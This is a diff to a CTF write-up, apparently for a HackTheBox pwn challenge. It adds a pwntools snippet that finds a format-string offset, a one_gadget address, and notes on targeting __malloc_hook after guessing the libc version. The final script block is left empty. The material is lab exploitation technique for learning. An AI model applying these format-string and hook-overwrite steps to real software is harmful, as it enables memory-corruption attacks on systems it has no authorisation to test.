@@ -144,6 +144,18 @@ for i in range(200):
 
 - So this is where my way gets unintended, I didn't leak the printf@got or fgets@got to get more accurate libc result, I immediately tried the `libc6_2.27-3ubuntu1_amd64 `. So what comes to my mind, if the `libc6_2.27-3ubuntu1_amd64` does not work, i will use the `libc6_2.27-3ubuntu1.2_amd64 ` and so on.
 
+> FYI --> snippet for get fmtstr offset.
+
+```py
+sh = process(exe)
+def exploit(payload):
+    sh.sendline(payload)
+    return sh.recvline().strip()
+
+format_strings = FmtStr(execute_fmt=exploit)
+log.success('OFFSET --> %d', format_strings.offset)
+```
+
 ---
 
 8. Download the libc and do pwninit.
@@ -154,7 +166,7 @@ for i in range(200):
 
 9. Great, let's grab one_gadget and __malloc_hook.
 
-> ONE_GADGET --> try the 2nd one.
+> ONE_GADGET --> try the 2nd one (0x4f322).
 
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/dd519df9-6320-47bd-b6e2-1d2b956849b6)
 
@@ -162,7 +174,13 @@ for i in range(200):
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/3daf400f-abd1-4894-adb4-3c73aeee7a87)
 
 
-10. 
+10. Our script so far.
+
+> SCRIPT (95%).
+
+```py
+
+```
 
 
 
